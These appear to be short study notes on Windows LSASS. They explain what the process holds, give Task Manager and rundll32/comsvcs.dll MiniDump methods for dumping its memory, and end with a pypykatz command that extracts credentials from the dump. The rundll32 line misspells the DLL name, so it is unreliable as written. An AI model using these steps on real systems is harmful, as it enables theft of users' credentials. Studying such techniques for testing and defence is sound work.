# What is LSASS
LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.

Upon initial login, lsass will: 
- cache creds locally in memory 
- create access tokens 
- enforce policies
- writes to window's security log
## Dumping LSASS process memory
Generating a memory dump of cached LSASS data
1. **Task manager method** 
	- Open task manager 
	- select the process tab
	- Right click LSA process
	- Create dump file
	- A file called `lsass.DMP` is created and saved in `%temp%`
2. **Rundll32.exe and Comsvcs.dll method**
	- Determine what `PID` is assigned to `lsass.exe` 
	cmd:
	```cmd 
	tasklist /svc
	```
	powershell:
	```powershell
	Get-Process lsass
	```
	- Create a dump file 
	```powershell
	rundll32 C:\windows\system32\comscvs.dll, MiniDump 672 C:\lsass.dmp full
	```
	With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). Recall that most modern AV tools recognize this as malicious activity and prevent the command from executing
## Extracting credentials(pypykatz)
```bash
pypykatz lsa minidump /path/to/dump
```
important  info 
